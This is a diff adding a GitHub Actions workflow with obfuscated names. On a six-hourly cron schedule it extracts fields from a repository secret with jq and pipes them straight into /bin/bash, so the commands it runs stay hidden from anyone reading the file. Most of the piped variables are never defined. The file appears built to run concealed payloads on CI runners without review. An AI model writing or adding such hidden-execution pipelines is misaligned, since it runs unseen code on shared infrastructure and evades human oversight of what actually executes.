@@ -1,0 +1,32 @@
+name: hongsezitii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongsezitii
+        env:
+          th97969: ${{ secrets.th97969 }}
+        run: |
+          echo $th97969 | jq -r .bfks1 | /bin/bash
+          echo $r4221 | jq -r .uhms12 | /bin/bash
+          echo $wjm9981 | jq -r .y139 | /bin/bash
+          echo $wm79 | jq -r .vklfw7 | /bin/bash
+          echo $vnp7289 | jq -r .hk55 | /bin/bash
+          echo $pix7511 | jq -r .gnupv01584 | /bin/bash
+          echo $hqi4 | jq -r .ffbf728 | /bin/bash
+          echo $xz94 | jq -r .n0419 | /bin/bash
+          echo $yvwq0589 | jq -r .fz28626 | /bin/bash
+          echo $om90 | jq -r .gzoq94017 | /bin/bash
+          echo $g6183 | jq -r .m5 | /bin/bash
+          echo $rwd77772 | jq -r .g2 | /bin/bash
+          echo $jt2 | jq -r .h83580 | /bin/bash
+          echo $bqct83 | jq -r .tlta6657 | /bin/bash
+
